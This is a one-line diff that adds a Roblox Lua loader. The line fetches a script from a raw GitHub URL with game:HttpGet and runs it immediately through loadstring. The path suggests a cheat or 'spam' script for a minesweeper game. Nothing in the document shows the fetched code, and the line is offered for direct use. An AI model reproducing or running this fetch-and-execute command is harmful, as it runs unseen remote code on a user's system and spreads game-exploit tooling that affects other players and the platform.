@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/blockerman-s-minesweeper-spam3-gxjv7diroeqkle.lua"))()
